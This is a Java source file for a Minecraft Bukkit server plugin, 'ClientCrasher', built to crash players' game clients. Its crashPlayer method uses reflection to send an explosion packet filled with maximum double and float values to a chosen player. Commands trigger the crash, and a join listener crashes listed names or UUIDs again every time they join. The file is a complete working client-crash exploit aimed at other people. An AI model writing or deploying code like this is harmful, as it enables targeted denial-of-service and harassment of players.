package me.gotitim.clientcrasher;

import me.gotitim.clientcrasher.command.AlwaysCrashCommand;
import me.gotitim.clientcrasher.command.CrashCommand;
import net.minecraft.network.protocol.game.PacketPlayOutExplosion;
import net.minecraft.server.level.EntityPlayer;
import net.minecraft.world.phys.Vec3D;
import org.bukkit.Bukkit;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.PlayerJoinEvent;
import org.bukkit.plugin.java.JavaPlugin;

import java.lang.reflect.Method;
import java.util.List;

public final class ClientCrasher extends JavaPlugin implements Listener {
    private static ClientCrasher instance;

    @Override
    public void onEnable() {
        instance = this;
        saveDefaultConfig();
        getCommand("crash").setExecutor(new CrashCommand());
        getCommand("alwayscrash").setExecutor(new AlwaysCrashCommand());

        getServer().getPluginManager().registerEvents(this, this);
    }

    @Override
    public void onDisable() { saveConfig(); }

    public static void crashPlayer(Player player) {
        String version = Bukkit.getServer().getClass().getPackage().getName().split("\\.")[3];
        try {
            Class<?> craftPlayerClass = Class.forName("org.bukkit.craftbukkit." + version + ".entity.CraftPlayer");
            Method getHandle = craftPlayerClass.getMethod("getHandle");
            EntityPlayer ePlayer = (EntityPlayer) getHandle.invoke(player);

            ePlayer.c.b(new PacketPlayOutExplosion(
                    Double.MAX_VALUE,
                    Double.MAX_VALUE,
                    Double.MAX_VALUE,
                    Float.MAX_VALUE,
                    List.of(),
                    new Vec3D(Double.MAX_VALUE, Double.MAX_VALUE, Double.MAX_VALUE)
            ));
        } catch (Exception e) {
            instance.getLogger().warning("Failed to find CraftPlayer class! Using package version " + version);
        }
    }

    public static ClientCrasher getInstance() {
        return instance;
    }

    @EventHandler
    public void onJoin(PlayerJoinEvent event) {
        String nick = event.getPlayer().getName();
        String uuid = event.getPlayer().getUniqueId().toString();
        for (String idNick : ClientCrasher.getInstance().getConfig().getStringList("always-crash")) {
            if(nick.equals(idNick) || uuid.equals(idNick)) {
                Bukkit.getScheduler().runTaskLater(this, () -> {
                    crashPlayer(event.getPlayer());
                }, 5);
                return;
            }
        }
    }
}
